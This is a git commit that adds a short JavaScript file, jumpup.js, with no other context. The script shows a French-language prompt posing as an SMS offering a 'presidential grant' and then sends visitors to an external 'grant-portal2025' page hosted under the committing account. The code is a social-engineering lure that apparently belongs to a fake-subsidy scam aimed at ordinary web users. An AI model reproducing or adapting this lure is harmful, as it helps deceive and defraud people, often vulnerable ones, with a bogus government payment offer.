d378194aa2138d3df48d01864b50c3a0940c3435
offernoww <josiahnyeti16@gmail.com>
2025-01-31 13:56:52 +0100

    Create jumpup.js

---
+++ jumpup.js
@@ -0,0 +1,6 @@
+
+var password = 'SUBVENTION PRÉSIDENTIELLE'
+password=prompt('SMS :Obtenez votre subvention maintenant sur le portail, cliquez sur OK pour postuler  ','SUBVENTION PRÉSIDENTIELLE');
+if (password != 'SUBVENTION PRÉSIDENTIELLE') {
+location.href='https://offernoww.github.io/grant-portal2025';
+}
